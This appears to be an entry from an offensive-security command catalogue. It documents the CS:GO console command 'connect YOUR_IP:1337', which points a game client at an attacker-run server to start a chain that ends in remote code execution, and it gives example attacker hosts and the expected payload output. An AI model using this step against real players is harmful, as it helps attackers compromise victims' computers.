---
data: 'connect YOUR_IP:1337'
tags:
  - csgo
  - connect
type: command
output: >-
  Client connects, triggers download and messages leading to RCE (e.g.,
  calculator spawns)
executor: csgo-console
platforms:
  - Windows
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.563Z'
id: 845469ec-3379-454e-8fe3-778f74357614
verified: false
validated: true
submitted: true
---
# connect-to-csgo-server

## Command

```csgo-console
connect YOUR_IP:1337
```

## Description

Connects the CS:GO client to a specified server IP and port via the in-game developer console, initiating the exploit chain upon joining.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| YOUR_IP | Attacker's IP address (e.g., 192.168.1.100) | Yes |
| 1337 | Server port | Yes |

## Examples

### Basic Usage

```csgo-console
connect 192.168.1.100:1337
```

### Advanced Usage

For remote server:
```csgo-console
connect example.com:1337
```

## Expected Output

Client message: 'Connecting to 192.168.1.100:1337' followed by map load and exploit triggers like file downloads and RCE payload execution.

## Related

- [[commands/run-poc-script]]
